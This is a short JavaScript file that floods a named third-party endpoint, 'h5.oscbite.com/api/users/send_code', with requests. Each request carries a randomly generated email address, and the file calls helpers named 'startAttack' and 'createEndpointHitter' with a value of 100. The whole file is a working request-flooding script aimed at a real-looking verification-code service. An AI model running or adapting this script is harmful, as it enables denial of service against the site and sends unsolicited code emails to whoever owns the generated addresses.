import { faker } from "@faker-js/faker";
import { createEndpointHitter, startAttack } from "./utils.js";

const API_URL = "https://h5.oscbite.com/api/users/send_code";

const generatePayload = () => {
  return {
    email: faker.internet.email(),
  };
};

const hitEndpoint = createEndpointHitter(API_URL, generatePayload);
startAttack(hitEndpoint, 100);
